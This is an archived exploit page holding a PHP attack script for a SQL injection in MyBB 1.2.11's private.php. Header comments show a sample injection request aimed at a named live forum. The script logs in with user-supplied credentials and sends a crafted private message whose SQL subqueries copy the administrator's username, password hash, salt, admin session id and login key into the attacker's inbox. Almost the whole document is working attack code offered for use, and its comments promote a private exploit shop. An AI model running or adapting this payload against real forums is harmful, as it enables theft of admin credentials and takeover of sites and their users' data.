<html><head><title>MyBulletinBoard (MyBB) <= 1.2.11 private.php SQL Injection Exploit (2)</title></head><pre>&lt;?php
// forum mybb &lt;= 1.2.11 remote sql injection vulnerability
// bug found by Janek Vind &quot;waraxe&quot; http://www.waraxe.us/advisory-64.html
// exploit write by c411k (not brutforce one symbol. insert hash in your PM in one action)
//
//		POST http://mybb.ru/forum/private.php HTTP/1.1
//		Host: mybb.ru
//		Cookie: mybbuser=138_4PN4Kn2BNaKOjo8ie4Yl2qadG77JTIeQyRoEAKgolr7uA55fZW
//		Content-Type: application/x-www-form-urlencoded
//		Content-Length: 479
//		Connection: Close
//
//		to=c411k&amp;message=co6ako_ykycuJIo&amp;options[disablesmilies]=',null,null),(138,138,138,1,'with+&lt;3+from+ru_antichat',9,concat_ws(0x3a,'username:password:salt+&gt;',(select+username+from+mybb_users+where+uid=4),(select+password+from+mybb_users+where+uid=4),(select+salt+from+mybb_users+where+uid=4),admin_sid',(select+sid+from+mybb_adminsessions+where+uid=4),'admin_loginkey',(select+loginkey+from+mybb_adminsessions+where+uid=4)),1121512515,null,null,'yes',null,null)/*&amp;action=do_send
//	
// greets all https://forum.antichat.ru  :)  b00zy/br 32sm. &lt;====3 oO :P ( .)(. ) :D :| root@dblaine#cat /dev/legs &gt; /dev/mouth
// and http://expdb.cc/?op=expdb /welcome to our priv8 exploits shop, greetz to all it's members/*
// 25.01.08

error_reporting(0);
@ini_set(&quot;max_execution_time&quot;,0);
@ini_set('output_buffering',0);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ob_implicit_flush(1);

header(&quot;Content-Type: text/html; charset=utf-8\r\n&quot;);
header(&quot;Pragma: no-cache&quot;);

?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;title&gt;mybb 1.2.11 xek&lt;/title&gt;
&lt;style&gt;
&lt;!--
A:link {COLOR: #B9B9BD; TEXT-DECORATION: none}
A:visited {COLOR: #B9B9BD; TEXT-DECORATION: none}
A:active {COLOR: #228B22; TEXT-DECORATION: none}
A:hover {COLOR: #E7E7EB; TEXT-DECORATION: underline}
BODY
{
	margin=&quot;5&quot;;
	FONT-WEIGHT: normal; 
	COLOR: #B9B9BD; 
	BACKGROUND: #44474F; 
	FONT-FAMILY: Courier new, Courier, Verdana, Arial, Helvetica, sans-serif; 
}

--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;?php

function myflush($timee)
{
	if(ob_get_contents())
	{
		ob_flush();
		ob_clean();
		flush();
		usleep($timee);
	}
}

if (!$_GET)
{
	echo 
	'&lt;form action=&quot;'.$_SERVER['PHP_SELF'].'?fuck_mybb&quot; method=&quot;post&quot;&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD; border-color: #646C71;&quot; type=&quot;submit&quot; value=&quot;&amp;#8194;get admin passwd...&amp;#8194;&quot;&gt;&lt;br&gt;&lt;br&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;hostname&quot; value=&quot;hostname&quot;&gt;
	&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; for expamle &quot;expdb.cc&quot;&lt;br&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;patch&quot; value=&quot;patch&quot;&gt;
	&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; patch 2 mybb forum, for expamle &quot;community/mybb&quot;&lt;br&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;username&quot; value=&quot;username&quot;&gt;
	&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; you username on this forum, for expamle &quot;c411k&quot;&lt;br&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;pwd&quot; value=&quot;password&quot;&gt;
	&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; you password, for expamle &quot;h1world&quot;&lt;br&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;uid_needed&quot; value=&quot;1&quot;&gt;
	&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; admin id, default 1&lt;br&gt;
	&lt;/form&gt;';
}


if (isset($_GET['fuck_mybb']))
{
$username = ($_POST['username']);
$pwd = ($_POST['pwd']);
$host_mybb = ($_POST['hostname']);
$patch_mybb = ($_POST['patch']);
$uid_needed = ($_POST['uid_needed']);
$login_mybb = 'member.php';
$pm_mybb = 'private.php';
$data_login = 'username='.$username.'&amp;password='.$pwd.'&amp;submit=Login&amp;action=do_login&amp;url=http%3A%2F%2Flocalhost%2Fmybb_1210%2Findex.php';

function sendd($host, $patch, $scr_nm, $method, $data_gp, $cook1e)
{
	global $send_http;
	$s = array();
	$url = fsockopen($host, 80);
	$send_http  = &quot;$method http://$host/$patch/$scr_nm HTTP/1.1\r\n&quot;;
	$send_http .= &quot;Host: $host\r\n&quot;;
	$send_http .= &quot;User-Agent: Mozilla/5.0 (oO; U; oO zzzz bzzzz brrr trrr; ru; rv:1.8.1.4) Gecko/20180515 Firefox/1.3.3.7\r\n&quot;;
	$send_http .= &quot;Cookie: $cook1e\r\n&quot;;
	$send_http .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$send_http .= &quot;Content-Length: &quot;.strlen($data_gp).&quot;\r\n&quot;;
	$send_http .= &quot;Connection: Close\r\n\r\n&quot;;
	if ($method === 'POST')
	{
		$send_http .= $data_gp;
	}
	//print_r($send_http);
	fputs($url, $send_http);
	while (!feof($url)) $s[] = fgets($url, 1028);
	fclose($url);
	return $s;
}

echo '&lt;pre&gt;- start....';
myflush(50000);

$get_cookie = sendd($host_mybb, $patch_mybb, $login_mybb, 'POST', $data_login, 'fuckkk');
echo '&lt;pre&gt;- login '.$username.' with passwd = '.$pwd.' done';
myflush(50000);

foreach ($get_cookie as $value)
{
	if (strpos($value, 'Set-Cookie: mybbuser=') !== false)
	{
		$value = explode(&quot;;&quot;, $value);
		$cookie = strstr($value[0], 'mybbuser');
		break;
	}
}
echo '&lt;pre&gt;- cookie: '.$cookie;
myflush(50000);

preg_match(&quot;/mybbuser=(.*)_/&quot;, $cookie, $m);
$get_uid = $m[1];
echo '&lt;pre&gt;- user id: '.$get_uid;
myflush(50000);

$data_expl = &quot;to=$username&amp;message=co6ako_ykycuJIo&amp;options[disablesmilies]=',null,null),($get_uid,$get_uid,$get_uid,1,'with+&lt;3+from+antichat.ru',9,concat_ws(0x3a,'username:password:salt+&gt;',(select+username+from+mybb_users+where+uid=$uid_needed),(select+password+from+mybb_users+where+uid=$uid_needed),(select+salt+from+mybb_users+where+uid=$uid_needed),' admin sid',(select+sid+from+mybb_adminsessions+where+uid=$uid_needed),' admin loginkey',(select+loginkey+from+mybb_adminsessions+where+uid=$uid_needed)),1121512515,null,null,'yes',null,null)/*&amp;action=do_send&quot;;
sendd($host_mybb, $patch_mybb, $pm_mybb, 'POST', $data_expl, $cookie);
echo '&lt;pre&gt;- send exploit:
-------------------
'.$send_http.'
-------------------
look you private messages 4 admin passwd hash &lt;a href=http://'.$host_mybb.'/'.$patch_mybb.'/'.$pm_mybb.' target=_blank&gt;http://'.$host_mybb.'/'.$patch_mybb.'/'.$pm_mybb.'&lt;/a&gt;';
}


?&gt;

&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2008-08-26]</pre></html>